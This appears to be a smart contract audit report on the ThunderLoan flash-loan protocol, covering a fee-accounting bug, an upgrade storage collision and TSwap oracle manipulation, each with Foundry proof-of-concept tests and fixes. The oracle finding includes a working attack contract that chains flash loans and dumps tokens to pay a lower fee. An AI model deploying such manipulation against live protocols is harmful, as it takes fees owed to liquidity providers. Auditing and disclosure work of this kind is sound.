### [H-1] Incorrect `updateExchangeRate` usage in `ThunderLoan:deposit` causes protocol to think it has more fees than it actually does, which blocks redemption of funds and incorrect exchange rate calculation

**Description:** In the ThunderLoan system, the `exchangeRate` is responsible for calculating the exchange rate between asset tokens and underlying tokens. In a way, it's responsible for keeping track of how many fees to give to liquidity providers.
However, the `deposit` function in the `ThunderLoan` contract uses the `updateExchangeRate` function incorrectly as it updates the exchange rate without collecting fees.

```javascript
    function deposit(
        IERC20 token,
        uint256 amount
    ) external revertIfZero(amount) revertIfNotAllowedToken(token) {
        AssetToken assetToken = s_tokenToAssetToken[token];
        uint256 exchangeRate = assetToken.getExchangeRate();
        uint256 mintAmount = (amount * assetToken.EXCHANGE_RATE_PRECISION()) /
            exchangeRate;
        emit Deposit(msg.sender, token, amount);

        assetToken.mint(msg.sender, mintAmount);

        uint256 calculatedFee = getCalculatedFee(token, amount);
@>      assetToken.updateExchangeRate(calculatedFee);

        token.safeTransferFrom(msg.sender, address(assetToken), amount);
    }
```

**Impact:** There are several impacts of this bug:

1. The `ThunderLoan::redeem` function is blocked from redeeming the total liquidity provider balance, because the protocol wants to transfer more than it should.
2. Rewards are calculated incorrectly, leading to liquidity providers getting more rewards than they should.

**Proof of Concept:**

1. LP deposits
2. User takes out a flash loan
3. LP tries to redeem their funds
4. The redeem function reverts

Place the following into `ThunderLoan.t.sol`:

```javascript
function test_audit_RedeemsAfterLoan() public setAllowedToken hasDeposits {
    uint256 amountToBorrow = AMOUNT * 10;
    uint256 calculatedFee = thunderLoan.getCalculatedFee(
        tokenA,
        amountToBorrow
    );

    vm.startPrank(user);
    tokenA.mint(address(mockFlashLoanReceiver), calculatedFee);
    thunderLoan.flashloan(
        address(mockFlashLoanReceiver),
        tokenA,
        amountToBorrow,
        ""
    );
    vm.stopPrank();

    uint256 amountToRedeem = type(uint256).max;

    vm.startPrank(liquidityProvider);
    thunderLoan.redeem(tokenA, amountToRedeem);
    vm.stopPrank();
}
```

**Recommended Mitigation:** Remove the incorrectly used `updateExchangeRate` function call from the `deposit` function.

```diff
    function deposit(
        IERC20 token,
        uint256 amount
    ) external revertIfZero(amount) revertIfNotAllowedToken(token) {
        AssetToken assetToken = s_tokenToAssetToken[token];
        uint256 exchangeRate = assetToken.getExchangeRate();
        uint256 mintAmount = (amount * assetToken.EXCHANGE_RATE_PRECISION()) /
            exchangeRate;
        emit Deposit(msg.sender, token, amount);

        assetToken.mint(msg.sender, mintAmount);

-       uint256 calculatedFee = getCalculatedFee(token, amount);
-       assetToken.updateExchangeRate(calculatedFee);

        token.safeTransferFrom(msg.sender, address(assetToken), amount);
    }
```

### [H-2] Mixing up variable location causes storage collisions in `ThunderLoan::s_flashLoanFee` and `ThunderLoan::s_currentlyFlashLoaning`

**Description:** `ThunderLoan` has 2 state variable in following order:

```javascript
    uint256 private s_feePrecision;
    uint256 private s_flashLoanFee;
```

However, the upgraded version `ThunderLoanUpgraded.sol` has them in totally different order:

```javascript
    uint256 private s_flashLoanFee;
    uint256 public constant FEE_PRECISION = 1e18;
```

Due to how Solidity storage works, after the upgrade the `s_flashLoanFee` will have the value of `s_feePrecision`. You cannot adjust the position of storage variables, and removing storage variables for constant variables, breaks the storage locations as well.

**Impact:** After the upgrade, the `s_flashLoanFee` will have the value of `s_feePrecision`, which is `1e18`. This means that users who take out flash loans after the upgrade will be charged incorrect fee.
Additionally, the `s_currentlyFlashLoaning` variable is now in the same storage slot as `s_flashLoanFee`, which breaks the main functionality of the protocol.

**Proof of Concept:**

Place the following into `ThunderLoan.t.sol`:

```javascript
    import {ThunderLoanUpgraded} from "../../src/upgradedProtocol/ThunderLoanUpgraded.sol";

    // ...

    function test_audit_UpgradedThunderLoanStorageBreaks() public {
        ThunderLoanUpgraded upgradedThunderLoan = new ThunderLoanUpgraded();

        uint256 feeBeforeUpgrade = thunderLoan.getFee();

        vm.prank(thunderLoan.owner());
        thunderLoan.upgradeToAndCall(address(upgradedThunderLoan), "");

        uint256 feeAfterUpgrade = upgradedThunderLoan.getFee();

        console2.log("Fee before upgrade: ", feeBeforeUpgrade);
        console2.log("Fee after upgrade: ", feeAfterUpgrade);
        assertNotEq(feeBeforeUpgrade, feeAfterUpgrade);
    }

```

You can also see the sotrage layout difference by running `forge inspect ThunderLoan storage` and `forge inspect ThunderLoanUpgraded storage`.

**Recommended Mitigation:** Instead of making the `FEE_PRECISION` variable constant, make it a state variable but leave it as blank. Also make sure to keep the storage variables in the same order.

```diff
+   uint256 private s_blank0;
    uint256 private s_flashLoanFee;
    uint256 public constant FEE_PRECISION = 1e18;
```

### [M-1] Using TSwap as price oracle leads to price and oracle manipulation attacks

**Description:** The TSwap protocol is a constant product formula based AMM. Thr price of a token is determined by how many reserves are on either side of pool. Because of this, it is easy for malicious users to manipulate the price of a token by buying or selling a large amount of the tokens in the same transaction, essentially ignoring protocol fees.

**Impact:** Liquidity providers will receive drastically reduced fees for providing liquidity.

**Proof of Concept:**

1. User takes a flash loan from `ThunderLoan` for 1k `tokenA`. They are charged the original fee `fee1`. During the flash loan, user does the following:
    1. User sells 1k `tokenA`, tanking the price.
    2. Instead of repaying right away, the user takes out another flash loan for another 1k `tokenA`.
    3. Due to the fact that `ThunderLoan` uses `TSwap` as a price oracle, the price of `tokenA` is still low, so the user is charged a lower fee `fee2`.
    4. User repays 2nd flash loan.
    5. User repays 1st flash loan.

Place the following test and contract into `ThunderLoan.t.sol`:

```javascript
    function test_audit_ManipulatesOraclePrice() public {
        // 1. Setup contracts
        tokenA = new ERC20Mock();
        BuffMockPoolFactory mockPoolFactory = new BuffMockPoolFactory(
            address(weth)
        );
        BuffMockTSwap tSwapPool = BuffMockTSwap(
            mockPoolFactory.createPool(address(tokenA))
        );

        thunderLoan = new ThunderLoan();
        proxy = new ERC1967Proxy(address(thunderLoan), "");
        thunderLoan = ThunderLoan(address(proxy));
        thunderLoan.initialize(address(mockPoolFactory));

        // 2. Fund T-Swap
        uint256 lpFunds = 100e18;
        vm.startPrank(liquidityProvider);
        tokenA.mint(liquidityProvider, lpFunds);
        tokenA.approve(address(tSwapPool), lpFunds);
        weth.mint(liquidityProvider, lpFunds);
        weth.approve(address(tSwapPool), lpFunds);
        tSwapPool.deposit(lpFunds, lpFunds, lpFunds, block.timestamp);
        vm.stopPrank();

        // 3. Fund ThunderLoan
        vm.prank(thunderLoan.owner());
        thunderLoan.setAllowedToken(tokenA, true);

        vm.startPrank(liquidityProvider);
        tokenA.mint(liquidityProvider, 1000e18);
        tokenA.approve(address(thunderLoan), 1000e18);
        thunderLoan.deposit(tokenA, 1000e18);
        vm.stopPrank();

        // 4. Take out 2 flashloans
        uint256 normalFeeCost = thunderLoan.getCalculatedFee(tokenA, 100e18);
        console2.log("Normal fee cost: ", normalFeeCost);
        // 0.296147410319118389

        uint256 amoutToBorrow = 50e18;
        FlashLoanReceiverHack hacker = new FlashLoanReceiverHack(
            tSwapPool,
            thunderLoan,
            address(thunderLoan.getAssetFromToken(tokenA))
        );

        vm.startPrank(user);
        tokenA.mint(address(hacker), amoutToBorrow * 100);
        weth.mint(address(hacker), amoutToBorrow * 100);
        thunderLoan.flashloan(address(hacker), tokenA, amoutToBorrow, "");
        vm.stopPrank();

        uint256 attackFeeCost = hacker.fee1() + hacker.fee2();
        console2.log("Attack fee cost: ", attackFeeCost);

        assertLt(
            attackFeeCost,
            normalFeeCost,
            "Attack fee cost should be less"
        );
    }
```

```javascript
    contract FlashLoanReceiverHack is IFlashLoanReceiver {
        BuffMockTSwap internal s_tSwapPool;
        ThunderLoan internal s_thunderLoan;
        address internal s_repayAddress;

        uint256 public fee1;
        uint256 public fee2;
        bool internal attacked;

        constructor(
            BuffMockTSwap tSwapPool,
            ThunderLoan thunderLoan,
            address repayAddress
        ) {
            s_tSwapPool = tSwapPool;
            s_thunderLoan = thunderLoan;
            s_repayAddress = repayAddress;
        }

        function executeOperation(
            address token,
            uint256 amount,
            uint256 fee,
            address /*initiator*/,
            bytes calldata /*params*/
        ) external returns (bool) {
            if (!attacked) {
                attacked = true;
                fee1 = fee;

                uint256 tokensBought = s_tSwapPool.getOutputAmountBasedOnInput(
                    50e18,
                    100e18,
                    100e18
                );
                IERC20(token).approve(address(s_tSwapPool), 50e18);
                s_tSwapPool.swapPoolTokenForWethBasedOnInputPoolToken(
                    50e18,
                    tokensBought,
                    block.timestamp
                );

                // // Call flashloan again
                s_thunderLoan.flashloan(address(this), IERC20(token), 50e18, "");

                // // Repay
                IERC20(token).transfer(s_repayAddress, amount + fee);
            } else {
                fee2 = fee;

                // Repay
                IERC20(token).transfer(s_repayAddress, amount + fee);
            }

            return true;
        }
    }
```

**Recommended Mitigation:** Consider using a different price oracle mechanism, like a Chainlink price feed or Uniswap TWAP fallback oracle.
